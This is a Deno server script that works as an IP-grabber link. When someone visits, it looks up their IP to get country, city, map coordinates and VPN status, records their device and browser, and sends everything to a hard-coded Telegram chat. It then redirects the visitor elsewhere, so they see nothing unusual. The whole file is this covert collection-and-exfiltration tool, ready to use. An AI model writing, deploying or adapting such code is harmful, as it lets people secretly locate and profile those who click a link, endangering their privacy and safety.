import { Application, Router } from "https://deno.land/x/oak/mod.ts";
import userAgent from 'https://deno.land/x/user_agent@v0.1.4/mod.ts';
import ipapi from 'https://deno.land/x/ipapi/mod.js'
import { getEmojiByName } from "https://deno.land/x/getmoji@1.2.4/mod.ts";

const app = new Application();
const router = new Router();

router.get("/", async (ctx) => {
  
  const userAgentString = ctx.request.headers.get("user-agent");
  const { browser, device, os } = userAgent(userAgentString);
  
  const ip = ctx.request.ip;
  const info = await ipapi(`${ip}`);
  const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
  const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
  const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
  const vpn = encodeURIComponent(`**VPN** : \`${info.proxy}\``);
  const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
  const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
  const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
  const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
  console.log(info)
   await fetch(
    `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage?chat_id=1495309346&text=${iptext}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${vpn}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${countryinfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${cityInfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${browser_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_os}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${userAgentString_v}&parse_mode=markdown`,
   );

  ctx.response.redirect(`${Deno.env.get("URL")}`);
});

app.use(router.routes());
app.use(router.allowedMethods());

await app.listen({ port: 8000 });
